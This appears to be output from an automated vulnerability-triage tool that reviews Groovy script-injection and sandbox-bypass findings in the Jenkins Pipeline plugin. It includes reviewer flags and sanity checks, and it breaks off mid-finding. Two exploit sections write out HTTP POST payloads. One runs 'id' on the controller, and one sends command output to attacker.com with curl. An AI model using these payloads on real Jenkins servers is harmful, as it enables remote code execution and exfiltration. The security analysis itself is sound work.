findings.description: User-controlled Groovy script content from HTTP form flows directly to CPS pipeline execution in ReplayAction.doRun(), allowing script injection with user-supplied arbitrary Groovy code
findings.reasoning: In doRun(), the user-supplied script content is read directly from the HTTP form via form.getString("mainScript") at line 214, then passed through run() -> run2() -> ReplayFlowFactoryAction -> CpsFlowExecution without sanitization. The sandbox flag is inherited from the original execution (execution.isSandbox()), but the script content itself is fully user-controlled. Any user with the REPLAY permission (which only requires Item.CONFIGURE level, not full admin/RUN_SCRIPTS) can submit arbitrary Groovy for execution. If the original build ran in sandboxed mode, the replayed script also runs in sandbox - but sandbox escapes are historically common in Jenkins. If the original was unsandboxed, isReplayableSandboxTest() requires Jenkins.RUN_SCRIPTS permission, which is appropriately restrictive. The core issue is that for sandboxed builds, users with only REPLAY permission can inject arbitrary Groovy that runs in the CPS sandbox, which has had numerous escape vulnerabilities.

evidence.dataflow_analysis: HTTP form -> form.getString('mainScript') (line 214) -> run(mainScript, ...) (line 214) -> run2(mainScript, ...) (line 245) -> ReplayFlowFactoryAction(mainScript, ..., execution.isSandbox()) (line 257) -> CpsFlowExecution(script, sandbox, owner, hint) (ReplayFlowFactoryAction.java line 69)
evidence.notes: The sandbox flag is not user-controllable (good), but the script content IS fully user-controlled. For sandboxed builds, the REPLAY permission (separate from RUN_SCRIPTS) allows injection of arbitrary code into the sandbox.

exploit_payload.code_snippet:
POST /job/my-pipeline/1/replay/doRun HTTP/1.1
Host: jenkins.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: <session with REPLAY permission>

mainScript=import+groovy.transform.*%0Athrow+new+Exception('RCE: '+['id'].execute().text)&Jenkins-Crumb=<crumb>
exploit_payload.scenario: Authenticated user with REPLAY permission (lower than admin) submits modified Groovy script via HTTP POST to doRun endpoint, injecting arbitrary code that executes in the CPS Groovy sandbox - and any sandbox escape leads to full RCE on the Jenkins controller
exploit_payload.prerequisites: Requires authentication with REPLAY permission on the target Jenkins job (granted via Item.CONFIGURE level access, separate from Jenkins.RUN_SCRIPTS)
exploit_payload.category: Script injection / Remote code execution via Groovy sandbox escape

flags.message: Sandbox protection significantly mitigates the risk for non-admin users
flags.evidence: The isReplayableSandboxTest() check ensures that non-sandboxed builds require Jenkins.RUN_SCRIPTS (admin) permission. For sandboxed builds, the Groovy sandbox restricts dangerous operations. The finding correctly identifies this but dismisses it too quickly - the sandbox provides real security value, and script injection into a sandbox is a much lower severity issue than unconstrained execution.

flags.message: REPLAY permission requirement is a meaningful access control gate
flags.evidence: The code checks isEnabled() and isReplayableSandboxTest() before processing. The REPLAY permission requires Item.CONFIGURE level access which is not trivially obtained. This is by design - replay functionality is intentionally allowing authorized users to modify and re-run pipeline scripts.

flags.message: This is the intended design of the Replay feature, but sandbox escape could be a real concern
flags.evidence: The Replay feature in Jenkins Workflow CPS plugin is explicitly designed to allow users with appropriate permissions to modify and re-run Groovy pipeline scripts. The question is whether this constitutes a vulnerability depends on whether the sandbox can be escaped. This is likely a known/intended behavior pattern but sandbox bypass scenarios (JENKINS-46914, etc.) have been historically reported.

sanity_check.reasoning: The finding accurately describes the code flow - user-controlled Groovy script content from HTTP form is passed to CPS pipeline execution. However, this is the intentional design of the Replay feature with security controls (permission checks, sandbox enforcement). The critical question is whether sandbox bypass is possible with user-controlled script content, which would elevate this to a true vulnerability. For non-sandboxed builds, admin-level RUN_SCRIPTS permission is required. For sandboxed builds, the Groovy sandbox restricts execution. This warrants manual security review to determine if sandbox bypass is feasible in practice, making it a manual review rather than a clear true or false positive.

findings.description: User-controlled Groovy script content from HTTP form via @DataBoundConstructor flows to CpsFlowExecution, executing arbitrary Groovy when sandbox=true (no script approval required)
findings.code_snippet: return new CpsFlowExecution(sandbox ? script : ScriptApproval.get().using(script, GroovyLanguage.get()), sandbox, owner, hint);
findings.reasoning: In CpsFlowDefinition.create(), the script is passed to CpsFlowExecution. When sandbox=true, the script is used directly (no ScriptApproval check), meaning arbitrary user-supplied Groovy runs in the sandbox. When sandbox=false, ScriptApproval.get().using() validates against an approved script list before execution. The script itself comes from HTTP form via @DataBoundConstructor at line 82: 'public CpsFlowDefinition(String script, boolean sandbox)'. A user with Job.CONFIGURE permission can create/update a pipeline with any Groovy script that runs sandboxed. The sandbox itself has had numerous historical escapes (e.g. CVE-2019-1003000, CVE-2022-30945). The CodeQL flow traces from line 137 (constructor parameter) to line 143/120 (CpsFlowExecution creation).

evidence.dataflow_analysis: HTTP form -> @DataBoundConstructor script param (line 82) -> this.script (line 84, when sandbox=true no approval check) -> CpsFlowExecution(sandbox ? script : ScriptApproval.using(...), sandbox, owner, hint) (line 120)
evidence.notes: The dual-path at line 120 is key: sandbox=true bypasses ScriptApproval entirely and runs user-supplied script directly in sandbox. sandbox=false goes through ScriptApproval.using() which validates the script against an admin-approved allowlist before execution. The vulnerability is the sandbox path accepting any script content.

exploit_payload.scenario: User with Job.CONFIGURE permission creates or modifies a sandboxed pipeline with arbitrary Groovy code that executes on the Jenkins controller; sandbox escapes lead to full RCE
exploit_payload.prerequisites: Requires Job.CONFIGURE permission on the target Jenkins job

flags.message: The sandbox=true path is intentional design, not a vulnerability - the sandbox IS the security control
flags.evidence: CpsFlowExecution with sandbox=true runs Groovy inside Groovy Sandbox (groovy-sandbox library), which restricts dangerous operations via AST transformation. The finding conflates 'no ScriptApproval check' with 'no security control', but the sandbox itself is the security boundary for this path.

flags.message: The sandbox=true path is the intended secure execution mode for untrusted scripts - bypassing ScriptApproval is by design
flags.evidence: Jenkins Pipeline's security model explicitly defines two modes: sandbox=true (any user with Job/Configure can write pipeline code, limited by Groovy sandbox) and sandbox=false (requires admin script approval). Treating sandbox=true as a vulnerability misunderstands the intended design. The actual risk is sandbox escapes (which are separate CVEs).

flags.message: Finding describes expected behavior of the plugin's dual-mode security architecture as a vulnerability
flags.evidence: The Jenkins Pipeline plugin intentionally allows sandbox=true scripts to run without ScriptApproval. This is documented behavior, not a vulnerability. If sandbox escapes exist in the groovy-sandbox library, those would be the actual vulnerabilities (e.g., CVE-2019-1003005, etc.), not this code path.

sanity_check.reasoning: The code accurately matches what is described, but the finding mischaracterizes intentional security architecture as a vulnerability. The Jenkins Pipeline plugin deliberately has two modes: sandbox=true (Groovy sandbox restricts execution, no ScriptApproval needed) and sandbox=false (ScriptApproval required, full Groovy power). The 'vulnerability' described is the documented, intended behavior. Real vulnerabilities in this area are sandbox escape bugs in the groovy-sandbox library, which are separate issues. This finding would generate false alerts for every Jenkins Pipeline installation using the sandbox mode, which is the recommended/default mode.

findings.description: User-controlled replacement script content from HTTP form reaches CpsFlowExecution via ReplayFlowFactoryAction, executing arbitrary Groovy in the pipeline context
findings.code_snippet: return new CpsFlowExecution(script, sandbox, owner, hint);
findings.reasoning: This is the final execution sink in the data flow chain originating from ReplayAction.doRun(). The replacementMainScript from the HTTP form (form.getString("mainScript") in ReplayAction line 214) flows through: doRun() -> run() -> run2() -> new ReplayFlowFactoryAction(replacementMainScript, ..., execution.isSandbox()) -> create() -> new CpsFlowExecution(script, sandbox, owner, hint). The script variable here is the user-supplied replacement script content. The sandbox flag is taken from the original execution (not user-controlled), but the script content is fully attacker-controlled. This creates a Groovy injection point where the user's arbitrary script is executed as a CPS pipeline without any content validation or sanitization.

evidence.dataflow_analysis: ReplayAction.doRun() line 214: form.getString('mainScript') -> ReplayAction.run() line 245 -> ReplayAction.run2() line 257: new ReplayFlowFactoryAction(replacementMainScript, ..., execution.isSandbox()) -> ReplayFlowFactoryAction.create() line 65: String script = replacementMainScript -> line 69: new CpsFlowExecution(script, sandbox, owner, hint)
evidence.notes: The sandbox field is marked 'transient' which means it won't be persisted. The constructor sets it from execution.isSandbox(). No content validation is performed on the script before execution.

exploit_payload.scenario: User with REPLAY permission on a sandboxed pipeline submits a modified script via doRun, which is stored in ReplayFlowFactoryAction and executed by CpsFlowExecution with the user-supplied Groovy code
exploit_payload.prerequisites: Requires authentication with REPLAY permission (lower than admin) on the target pipeline job that has had at least one build
exploit_payload.category: Script injection / Groovy code execution leading to RCE

flags.message: The vulnerability requires specific permissions (Replay permission) to exploit, significantly reducing the attack surface
flags.evidence: ReplayAction.doRun() would require the user to have Run/Replay permission on the Jenkins job, meaning this is not freely exploitable by anonymous users. The design intent is that authorized users can replay pipeline builds with modified scripts.

flags.message: The sandbox flag is preserved from the original execution rather than being user-controlled, which is a partial mitigation
flags.evidence: Evidence notes: 'sandbox field is declared as private transient final boolean sandbox - taken from execution.isSandbox() in run2(), not from user input.' This means if the original job ran in sandbox mode, the replay also runs in sandbox mode, limiting what can be executed.

flags.message: The core concern is whether users with Replay permission can escalate by injecting scripts that bypass sandbox restrictions or perform unauthorized actions
flags.evidence: If the original pipeline ran outside sandbox (e.g., admin-configured Scripted Pipeline), a user with only Replay permission could inject arbitrary non-sandboxed Groovy. This could be a privilege escalation if Replay permission is granted more broadly than script-writing permission.

sanity_check.reasoning: The finding correctly identifies a data flow from user HTTP input to CpsFlowExecution, which is accurate and not hallucinated. However, the exploitability depends heavily on permission configuration: if Replay permission is granted to users who don't otherwise have script-writing ability, and the original pipeline runs outside sandbox, this becomes a privilege escalation vector. The sandbox preservation from the original execution is a partial mitigation but doesn't fully address the risk when sandbox=false. This warrants manual review to assess the permission model and whether the Jenkins security model considers this by design or a vulnerability.

findings.description: HTTP form submission to doRun() provides user-controlled script content and replacement loaded scripts that flow to Groovy execution - the entry point for script injection
findings.reasoning: This is the HTTP input source in the injection chain. req.getSubmittedForm() at line 207 retrieves the full HTTP form POST data. Line 212 extracts replacement loaded scripts (library scripts) from the form using optString() - these are also user-controlled Groovy scripts (shared library classes). Line 214 extracts the main Groovy pipeline script via form.getString("mainScript") - completely user-controlled. Both the mainScript and replacementLoadedScripts are passed without any content sanitization to run(), which eventually calls CpsFlowExecution. The only access control is the REPLAY permission check at line 204 (isEnabled() && isReplayableSandboxTest()), which allows users with REPLAY permission to execute sandboxed Groovy. Additionally, replacement loaded scripts in line 212 allow injection of arbitrary shared library code, potentially bypassing sandbox restrictions that only apply to the main script.

evidence.dataflow_analysis: req (StaplerRequest) -> req.getSubmittedForm() -> form.getString('mainScript') -> run(mainScript, replacementLoadedScripts) -> run2() -> ReplayFlowFactoryAction -> CpsFlowExecution
evidence.notes: Two injection points here: (1) mainScript - replaces the main Jenkinsfile, (2) replacementLoadedScripts - replaces shared library scripts. Both are user-controlled from the HTTP form. The replacementLoadedScripts injection is particularly interesting as loaded library scripts may have different sandbox rules.

exploit_payload.code_snippet:
# Attack using both mainScript and replacement loaded scripts
POST /job/pipeline-with-libraries/42/replay/doRun HTTP/1.1
Host: jenkins.example.com  
Content-Type: application/x-www-form-urlencoded
Cookie: <session with REPLAY permission>

# Replace mainScript with malicious Groovy
mainScript=@GrabConfig(disableChecksums=true)%0Anode+%7B+sh+'id'+%7D
# Also replace any loaded shared library script
&vars_MyLib=package+vars%0Adef+call()+%7B+['bash','-c','curl attacker.com/$(id)'].execute().waitFor()+%7D
&Jenkins-Crumb=<crumb>
exploit_payload.scenario: Authenticated user with REPLAY permission submits HTTP form to doRun with malicious mainScript and replacement loaded scripts, injecting arbitrary Groovy code executed on the Jenkins controller
exploit_payload.prerequisites: Requires REPLAY permission on a Jenkins pipeline job that has completed at least one build

flags.message: Access control check exists but may be insufficient depending on permission model
flags.evidence: The code checks isEnabled() and isReplayableSandboxTest() before processing. The question is whether sandbox restrictions are properly enforced downstream when scripts execute via CpsFlowExecution. If the sandbox is active, Groovy script injection is sandboxed; if users can bypass sandbox, this becomes critical.

flags.message: This is a well-known attack surface in Jenkins Pipeline replay functionality
flags.evidence: The Jenkins Pipeline replay feature is a known vector - CVE-2019-10300 and related advisories address script injection via replay. The finding identifies the HTTP entry point accurately.

sanity_check.reasoning: The code accurately shows user-controlled input from HTTP form submission being passed to Groovy script execution via the run() method. The access control checks (isEnabled() and isReplayableSandboxTest()) provide some protection, but the key question is whether the Groovy sandbox is properly enforced for all script types including replacement loaded scripts. The replacementLoadedScripts injection vector is particularly concerning as shared library scripts may execute with different sandbox rules than the main script. This is a legitimate code injection entry point (CWE-094) in production code, though actual exploitability depends on the downstream sandbox enforcement and the caller's permissions.

findings.description: User-controlled script content from HTTP form reaches pipeline execution factory (ReplayFlowFactoryAction) constructor, establishing the injection point before Groovy execution
findings.reasoning: This is the critical junction point in run2() where: (1) the user-controlled replacementMainScript (from form.getString("mainScript") in doRun()) is packaged into a ReplayFlowFactoryAction along with execution.isSandbox() (NOT user-controlled). This action is then scheduled as a new build. When the build runs, ReplayFlowFactoryAction.create() is called which passes the user script directly to new CpsFlowExecution(script, sandbox, owner, hint). The sandbox=execution.isSandbox() means the sandbox state is inherited from the original build - if the original was sandboxed, replay also runs sandboxed (but with user-supplied script). This is the point where the taint chain from HTTP input flows into the pipeline execution infrastructure. The codeql flow in Query 5 traces from line 203/207 (HTTP input) through lines 214, 245, 246, 257, 263 to the execution factory.

evidence.dataflow_analysis: Query 5 flow: HTTP input (line 203) -> getSubmittedForm() (line 207) -> form (line 212) -> form.getString('mainScript') (line 214) -> run(mainScript,...) (line 214) -> run2(mainScript,...) (line 245) -> new ReplayFlowFactoryAction(replacementMainScript,...) (line 257) -> scheduleBuild2 (line 263) -> eventually ReplayFlowFactoryAction.create() -> new CpsFlowExecution(script, sandbox, owner, hint)
evidence.notes: Key observation: execution.isSandbox() ensures sandbox flag matches original build - protects against sandbox bypass. However, user still controls 100% of the script content that executes in the sandbox.

exploit_payload.scenario: Attacker with REPLAY permission triggers a new pipeline build with user-supplied Groovy via doRun, which packages the script into ReplayFlowFactoryAction and schedules execution on the Jenkins controller
exploit_payload.prerequisites: Requires REPLAY permission on a Jenkins pipeline with at least one completed build

flags.message: Sandbox enforcement is present - the sandbox flag comes from the original execution, not from user input
flags.evidence: execution.isSandbox() ensures the sandbox setting matches the original build. Users cannot bypass sandbox via replay. The vulnerability only exists if the user already has 'Replay' permission, which is typically restricted to trusted users.

flags.message: Permission check exists upstream - doRun() has hasPermission checks before reaching this code
flags.evidence: The replay feature requires explicit 'Replay' permission (typically restricted to admins or trusted users). If proper ACL checks exist in doRun(), this is not exploitable by arbitrary users.

flags.message: Potential sandbox escape if sandbox was disabled on original build - non-sandboxed script execution with user-controlled content
flags.evidence: If the original build ran without sandbox (execution.isSandbox() == false), a user with Replay permission could submit arbitrary Groovy code that executes without sandbox restrictions. This is by design for non-sandboxed pipelines but may constitute privilege escalation in some configurations.

sanity_check.reasoning: The finding correctly identifies that user-controlled script content flows into pipeline execution, but the severity is overstated. The code preserves the sandbox setting from the original execution (not user-controlled), and Replay permission is typically restricted to trusted users. The real concern is: if a user has Replay permission on a non-sandboxed pipeline, they can execute arbitrary Groovy - but this is largely by design. The vulnerability's actual risk depends heavily on how Replay permissions are configured, making this a manual review case rather than a clear critical vulnerability.

findings.description: Groovy sandbox bypass via direct GroovyClassLoader.parseClass() in doCheckScriptCompile - sandbox not enforced during compilation
findings.reasoning:
The method `doCheckScriptCompile` is an HTTP POST endpoint that accepts a Groovy script `value` from a user with `Job.CONFIGURE` permission. At line 143, it calls `.getClassLoader().parseClass(value)` directly on the `GroovyClassLoader` (a `CleanGroovyClassLoader` instance). 

This bypasses `CpsGroovyShell.parse()` which calls `doParse()` which wraps compilation in a `GroovySandbox.Scope` to enforce sandbox restrictions. By calling `parseClass()` on the raw `GroovyClassLoader`, the GroovySandbox interceptor is NOT active during compilation.

Additionally, line 142 creates a `forTrusted()` shell (unsandboxed), which is used as the parent class loader for the sandboxed shell on line 143. Even though the shell on line 143 is configured with `withSandbox(true)`, the `parseClass()` method is called directly on the class loader without going through `CpsGroovyShell.parse()`, so the sandbox scope is never entered.

This allows:
1. Groovy's `@Grab` annotation to execute at compile time (fetching and loading arbitrary code)
2. Custom AST transforms to execute arbitrary code during compilation
3. Any compile-time Groovy metaprogramming to bypass sandbox restrictions

A user with `Job.CONFIGURE` can submit a crafted Groovy script to this endpoint and execute arbitrary code on the Jenkins controller without script approval.

evidence.dataflow_analysis: HTTP @QueryParameter String value -> doCheckScriptCompile -> getClassLoader().parseClass(value) -- no sandbox scope wrapping the parseClass call
evidence.notes: The forTrusted() shell at line 142 creates an unsandboxed shell. The intent was for the trusted shell to serve as parent class loader. The sandboxed shell on line 143 does set withSandbox(true) in its config, but parseClass() on the GroovyClassLoader doesn't go through CpsGroovyShell.parse() which would enforce the sandbox at runtime.

exploit_payload.scenario: Authenticated user with Job.CONFIGURE permission sends crafted Groovy script to doCheckScriptCompile endpoint - compile-time AST transforms or static initializers execute on the Jenkins controller without sandbox restrictions
exploit_payload.prerequisites: Requires Job.CONFIGURE permission on a Pipeline job
exploit_payload.category: Sandbox bypass leading to arbitrary code execution on Jenkins controller

flags.message: The vulnerability requires Job.CONFIGURE permission, which is already a highly privileged role in Jenkins
flags.evidence: Line: 'if (!job.hasPermission(Job.CONFIGURE)) { return CpsFlowDefinitionValidator.CheckStatus.SUCCESS.asJSON(); }' - only users with configure access can reach the parseClass() call

flags.message: This is a compile-time check endpoint, not a script execution endpoint. The risk is about compile-time AST transforms or @Grab annotations being processed without sandbox enforcement, which is a narrower attack surface than full code execution
flags.evidence: The method is doCheckScriptCompile and only catches CompilationFailedException - it's validating syntax/compilation, not executing the script

flags.message: The claim that parseClass() bypasses GroovySandbox.Scope is technically plausible and the code analysis appears accurate, but the actual exploitability depends on whether AST transforms or other compile-time mechanisms can achieve meaningful code execution without the sandbox scope being active
flags.evidence: CpsGroovyShell.parse() wraps compilation in GroovySandbox.Scope via doParse(), while parseClass() on the raw GroovyClassLoader bypasses this wrapper. The sandboxed shell is built with withSandbox(true) but the sandbox scope is never entered during parseClass().

flags.message: The withSandbox(true) configuration on the CpsGroovyShell may still set up some compile-time customizers on the GroovyClassLoader that partially restrict behavior, even without the GroovySandbox.Scope wrapper
flags.evidence: CpsGroovyShellFactory.withSandbox(true).build() configures the shell and its underlying GroovyClassLoader with sandbox-related AST transformations at the compiler configuration level, potentially independent of the runtime scope

sanity_check.reasoning: The finding identifies a real architectural inconsistency: the doCheckScriptCompile endpoint calls parseClass() on the raw GroovyClassLoader rather than going through CpsGroovyShell.parse() which wraps compilation in a GroovySandbox.Scope. This is technically accurate based on the code. However, the actual exploitability is uncertain because: (1) it requires Job.CONFIGURE permission which is already highly privileged, (2) some sandbox enforcement may still occur through compiler-level customizers set by withSandbox(true), and (3) the severity depends on what compile-time attacks are possible without the sandbox scope. This warrants manual security expert review to confirm whether this bypass provides meaningful additional attack capability beyond what a Job.CONFIGURE user already has.

findings.description: ReplayAction.doRun accepts user-provided Groovy scripts from HTTP form and executes them, with sandbox bypass possible for non-sandboxed pipelines
findings.reasoning:
The `doRun` HTTP endpoint reads `mainScript` and loaded scripts directly from the HTTP form submission. These user-provided scripts are passed to `run()` → `run2()` which creates a `ReplayFlowFactoryAction` with the replacement scripts and schedules a new build. 

The sandbox mode is inherited from `execution.isSandbox()`. For non-sandboxed pipelines, this requires `Jenkins.RUN_SCRIPTS` (admin) permission via `isReplayableSandboxTest()`. For sandboxed pipelines, only the `REPLAY` permission (defaulting to `Item.CONFIGURE`) is required.

However, the key concern is: for sandboxed pipelines, a user with REPLAY permission can submit ANY Groovy script and it will be executed in the sandbox. If the sandbox has bypasses (e.g., via the compile-time bypass in doCheckScriptCompile), this creates a full RCE chain. Additionally, the form data directly controls the Groovy script content that will be executed as a pipeline job.

evidence.code_context:
doRun reads form data:
  JSONObject form = req.getSubmittedForm();
  form.getString('mainScript') -> passed to run() -> run2() -> ReplayFlowFactoryAction
  form.optString(entry.getKey()...) -> loaded scripts

run2() creates:
  actions.add(new ReplayFlowFactoryAction(replacementMainScript, replacementLoadedScripts, execution.isSandbox()));

Permission check:
  isEnabled() checks REPLAY permission (Item.CONFIGURE by default)
  isReplayableSandboxTest() checks: if non-sandboxed, requires Jenkins.RUN_SCRIPTS; if sandboxed, returns true

For sandboxed pipelines: REPLAY permission holder can submit arbitrary scripts to be executed in sandbox context.
evidence.dataflow_analysis: HTTP form.getString('mainScript') -> run() -> run2() -> ReplayFlowFactoryAction(replacementMainScript) -> scheduled build execution
evidence.notes: The sandbox enforcement during actual execution happens via CpsGroovyShell/SandboxCpsTransformer. The vulnerability combines with the compile-time bypass in doCheckScriptCompile for full RCE.

exploit_payload.scenario: User with REPLAY permission submits modified Groovy script via HTTP form to rerun a sandboxed pipeline build, with opportunity to bypass sandbox via compile-time AST transforms
exploit_payload.prerequisites: REPLAY permission (equivalent to Job.CONFIGURE by default) on a pipeline job with an existing build
exploit_payload.category: Arbitrary Groovy script execution / sandbox bypass

flags.message: This is a known design pattern in Jenkins Pipeline Replay functionality, but the specific code path and permission bypass scenario may represent a real vulnerability
flags.evidence: The doRun endpoint accepts user-provided Groovy scripts and executes them. For sandboxed pipelines, only REPLAY permission (not admin) is required, allowing arbitrary script execution within the sandbox. The sandbox itself may be bypassable.

sanity_check.reasoning: The code accurately shows that doRun reads user-supplied Groovy script content (mainScript and loaded scripts) from HTTP form data and passes them to run() for execution. The permission check via isReplayableSandboxTest() does enforce Jenkins.RUN_SCRIPTS for non-sandboxed pipelines, but for sandboxed pipelines only the lower REPLAY permission is needed, allowing potentially untrusted users to inject arbitrary Groovy code that executes in a sandbox. This is a legitimate CWE-094 (Code Injection) concern because the sandbox provides imperfect protection and has historically been bypassed. The code is production runtime code in a Jenkins plugin, not test or build script code, making it reachable via HTTP.

findings.description: CpsScript.evaluate() executes arbitrary Groovy scripts via the CPS shell - sandbox enforcement depends on shell configuration
findings.reasoning:
CpsScript.evaluate(String) and run(File, String[]) delegate to `$getShell()` which returns the execution's shell obtained from `CpsThreadGroup.current().getExecution().getShell()`. The shell is the sandboxed CPS-transformed shell (not the trusted one), so sandbox enforcement applies here. 

These methods are called from within the pipeline execution context (Groovy script calls `evaluate()` or `run()`). The sandbox mode (sandboxed vs trusted) is inherited from the overall execution configuration. This is a normal execution path — not a standalone vulnerability — but it represents a potential attack surface if sandbox enforcement has gaps.

This needs manual review to verify: does the shell's evaluate() call go through doParse() with sandbox scope? Or does it use a different code path that might bypass the sandbox?

evidence.notes: The sandbox scope IS entered via the doParse() method when going through CpsGroovyShell.parse(). However, the file-based evaluate() and run() methods also delegate to the shell, which could load scripts from the workspace - these could be attacker-controlled if the workspace is writable.

flags.message: Sandbox enforcement is inherited from execution context, not bypassed by evaluate()
flags.evidence: The evidence shows CpsGroovyShellFactory sets sandbox=true when execution.isSandbox(), and the doParse() path goes through GroovySandbox.Scope.enter(). For sandboxed executions, the sandbox is properly enforced. The string-based evaluate() is not inherently more dangerous than the surrounding pipeline code.

flags.message: File-based evaluate() and run() methods could load attacker-controlled scripts from workspace
flags.evidence: evaluate(File) and run(File, String[]) load scripts from file paths that could be workspace paths. If an attacker can write to the workspace, they could influence what files are evaluated. However, this still goes through the sandbox if the execution is sandboxed.

flags.message: The real risk is in non-sandboxed execution contexts (trusted pipelines) where evaluate() runs arbitrary Groovy without restriction
flags.evidence: For non-sandboxed executions (trusted pipelines using CpsTransformer instead of SandboxCpsTransformer), the evaluate() methods can execute arbitrary Groovy code. However, in trusted pipelines, the entire script already has this capability, so evaluate() doesn't add additional risk.

flags.message: The comment acknowledges async execution behavior but sandbox is properly delegated to shell configuration
flags.evidence: The finding describes a design property (sandbox inherited from execution) rather than a specific exploitable vulnerability. The code correctly delegates to the shell which enforces appropriate sandbox settings.

sanity_check.reasoning: The evaluate() method delegates to the CPS shell which properly inherits sandbox enforcement from the execution context. For sandboxed pipelines, the sandbox is enforced; for trusted pipelines, the entire script already operates without sandbox restrictions, so evaluate() doesn't create additional attack surface. The file-based methods present a marginal concern if workspace contents are attacker-controlled, but this is an inherent property of file-based script execution in CI/CD systems. This is a design-level concern that warrants manual review rather than a clear-cut vulnerability.

findings.description: LoadStepExecution executes Groovy scripts loaded from workspace files, with script content replaceable via ReplayAction
findings.reasoning:
LoadStepExecution loads Groovy files from the workspace and parses them via `execution.getShell().parse(text)`. Importantly, it also calls `ReplayAction.replace(execution, clazz)` which can substitute the script content with the user-supplied replacement from a replay action. 

This means an attacker with REPLAY permission can control the content of loaded scripts via the `replacementLoadedScripts` map passed to ReplayAction. The script text is then parsed via `execution.getShell().parse(text)` which goes through the proper CpsGroovyShell path (calling doParse() with sandbox scope for sandboxed executions).

The key concern: if sandbox enforcement has gaps (like the compile-time bypass via doCheckScriptCompile), this execution path could also be exploited. For non-sandboxed executions, REPLAY requires admin permissions, so that's appropriately guarded. For sandboxed executions, the sandbox should protect execution.

Manual review needed to confirm: does the sandbox reliably prevent exploitation through loaded scripts when using the AST transform bypass?

evidence.code_context:
1. ReplayAction.replace() allows substituting script text for loaded scripts during replay
2. execution.getShell().parse(text) goes through CpsGroovyShell.parse() -> doParse() with sandbox scope
3. For sandboxed pipelines: sandbox IS enforced during parsing
4. But compile-time AST transforms can bypass sandbox (see doCheckScriptCompile finding)
5. REPLAY permission (default=Job.CONFIGURE) required to control script content
evidence.dataflow_analysis: ReplayAction.doRun -> run() -> run2() -> ReplayFlowFactoryAction(replacementLoadedScripts) -> LoadStepExecution -> ReplayAction.replace() -> text = newText -> execution.getShell().parse(text) -> CpsGroovyShell.parse() -> doParse()
evidence.notes: This is part of the intended replay functionality. The sandbox enforcement in parse() is correct. The risk is the combination of REPLAY permission + sandbox bypass via AST transforms.

flags.message: Exploitability depends on sandbox bypass via AST transforms, not directly on this code
flags.evidence: The code itself correctly applies sandbox enforcement via execution.getShell().parse(text). The potential vulnerability is a combination of REPLAY permission + a separate sandbox bypass mechanism (AST transforms), making this a secondary/chained vulnerability rather than a standalone one.

flags.message: ReplayAction-based script injection is an intentional feature that could be abused if sandbox bypass is possible
flags.evidence: The dataflow from ReplayAction.replace() substituting script content is by design. The security concern is whether sandbox enforcement in CpsGroovyShell.parse() is sufficient to prevent malicious code execution.

flags.message: REPLAY permission requirement limits attack surface significantly
flags.evidence: The evidence notes that REPLAY permission defaults to Job.CONFIGURE, meaning an attacker would need significant existing permissions to exploit this. This reduces severity but doesn't eliminate the risk entirely.

sanity_check.reasoning: The finding correctly identifies that ReplayAction.replace() can substitute loaded script content, which then gets parsed and executed. The code accurately reflects this flow. However, the actual vulnerability is conditional on a separate sandbox bypass mechanism (compile-time AST transforms), making this a chained attack requiring REPLAY permission plus an AST transform bypass. This is a legitimate concern but needs human expert review to determine whether it constitutes an independent finding or is already covered by sandbox bypass CVEs.

findings.description: CpsGroovyShell.parse() and reparse() execute user-controlled Groovy scripts - reparse() bypasses script recording but both execute code in CPS execution context
findings.reasoning:
The `CpsGroovyShell.parse()` and `reparse()` methods both call `doParse()` which correctly sets up a `GroovySandbox.Scope`. This is the CORRECT path that enforces sandbox restrictions during script compilation and execution.

However, in `CpsFlowDefinition.doCheckScriptCompile` (the critical vulnerability), `parseClass()` is called directly on the `GroovyClassLoader` obtained via `getClassLoader()`, which BYPASSES this `doParse()` method entirely. The contrast between the secure path (`parse()`/`reparse()` → `doParse()` → `GroovySandbox.Scope`) and the insecure path (`getClassLoader().parseClass()`) is what creates the vulnerability.

The `reparse()` method specifically states it is for internal use to reload from persisted state without recording. It does correctly go through `doParse()` and the sandbox scope, so this itself is not a vulnerability. The key finding is the bypass of the entire `CpsGroovyShell` parse methods in `doCheckScriptCompile`.

evidence.code_context:
Secure path used by normal execution:
  CpsGroovyShell.parse(codeSource) -> doParse() -> GroovySandbox.enter() -> super.parse()
  CpsGroovyShell.reparse(className, text) -> doParse() -> GroovySandbox.enter() -> super.parse()

Insecure path used by doCheckScriptCompile:
  .getClassLoader().parseClass(value) -- bypasses ALL of CpsGroovyShell, goes directly to GroovyClassLoader.parseClass()
  GroovySandbox.Scope is NEVER entered

The contrast between these paths is the core of the vulnerability.
evidence.dataflow_analysis:
doCheckScriptCompile: value -> getClassLoader().parseClass(value) [NO sandbox scope]
vs normal: script -> CpsGroovyShell.parse() -> doParse() -> GroovySandbox.Scope.enter() -> super.parse() [WITH sandbox scope]
evidence.notes: The CpsGroovyShell.parse() and reparse() methods are correctly implemented with sandbox enforcement. The vulnerability is specifically in doCheckScriptCompile which bypasses these methods.

exploit_payload.scenario: The CpsGroovyShell parse methods are the correct sandboxed execution path. The vulnerability exists because doCheckScriptCompile skips these methods and calls parseClass() directly on the underlying GroovyClassLoader.
exploit_payload.prerequisites: Job.CONFIGURE permission; exploitation via doCheckScriptCompile endpoint

flags.message: The described vulnerability is in a different file/method than the one reported
flags.evidence: The finding claims CpsGroovyShell.parse() and reparse() are vulnerable at line 112, but the reasoning and evidence clearly state these methods are SECURE. The actual alleged vulnerability is in CpsFlowDefinition.doCheckScriptCompile() which is a completely different file and class not shown in the code snippet.

flags.message: The file location and description are mismatched - the code at the reported location is the secure implementation, not the vulnerable one
flags.evidence: CpsGroovyShell.java:112 shows doParse() correctly implementing GroovySandbox.enter() scope. The finding's own reasoning acknowledges: 'The CpsGroovyShell.parse() and reparse() methods are correctly implemented with sandbox enforcement.'

flags.message: If there is a real vulnerability, it exists in doCheckScriptCompile in a different file (CpsFlowDefinition.java), not in the file being reported
flags.evidence: The evidence section itself says: 'The vulnerability is specifically in doCheckScriptCompile which bypasses these methods' - this confirms the reported file/location is wrong for this finding.

sanity_check.reasoning: The finding is filed against CpsGroovyShell.java but the code at that location is explicitly identified as the SECURE path with proper sandbox enforcement. The actual alleged vulnerability (in doCheckScriptCompile) exists in a different file entirely (CpsFlowDefinition.java). The finding description contradicts itself - it identifies the code in question as the secure implementation while attributing the vulnerability to it. This is a mislabeled finding pointing to the wrong location; the reported file/line contains no vulnerability.

findings.description: ReplayAction.doCheckScriptCompile delegates to CpsFlowDefinition.DescriptorImpl.doCheckScriptCompile which has a sandbox bypass via direct GroovyClassLoader.parseClass()
findings.reasoning:
